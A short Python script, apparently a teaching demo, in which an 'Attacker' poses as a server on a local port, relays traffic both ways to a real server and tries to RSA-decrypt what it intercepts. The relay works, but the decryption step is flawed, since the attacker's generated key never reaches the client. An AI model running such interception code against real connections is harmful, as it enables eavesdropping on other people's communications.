import socket
import threading
import random
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def generate_rsa_key():
    return RSA.generate(2048)

def decrypt_message(encrypted_message, private_key):
    cipher = PKCS1_OAEP.new(private_key)
    return cipher.decrypt(encrypted_message).decode()

def intercept_and_forward(src_socket, dest_socket, private_key):
    while True:
        try:
            data = src_socket.recv(1024)
            if not data:
                break

            # Decrypt the intercepted message if possible
            try:
                decrypted_message = decrypt_message(data, private_key)
                print(f"Attacker Intercepted (decrypted): {decrypted_message}")
            except Exception:
                print("Attacker couldn't decrypt the message (likely secure)")

            # Forward the intercepted data to the intended destination
            dest_socket.send(data)
        except Exception as e:
            print(f"Error intercepting data: {e}")
            break

def attacker():
    client_port = 12345  # Port to which the Client connects
    server_ip = '127.0.0.1'
    server_port = 54321  # Port where the Attacker will forward data to Server

    # Set up the socket to act as a fake server for the client
    fake_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fake_server_socket.bind(('0.0.0.0', client_port))
    fake_server_socket.listen(1)
    print(f"Attacker is listening on port {client_port} (pretending to be the Server)")

    client_conn, client_addr = fake_server_socket.accept()
    print(f"Connection intercepted from Client at {client_addr}")

    # Set up the socket to connect to the actual server
    real_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    real_server_socket.connect((server_ip, server_port))
    print(f"Attacker connected to the real Server at {server_ip}:{server_port}")

    # Generate RSA key pair for the attacker
    rsa_key = generate_rsa_key()
    print("Attacker's RSA Key Pair Generated")

    # Start two threads to handle bidirectional interception
    client_to_server_thread = threading.Thread(target=intercept_and_forward, args=(client_conn, real_server_socket, rsa_key))
    server_to_client_thread = threading.Thread(target=intercept_and_forward, args=(real_server_socket, client_conn, rsa_key))

    client_to_server_thread.start()
    server_to_client_thread.start()

    client_to_server_thread.join()
    server_to_client_thread.join()

    client_conn.close()
    real_server_socket.close()
    fake_server_socket.close()

if __name__ == "__main__":
    attacker()
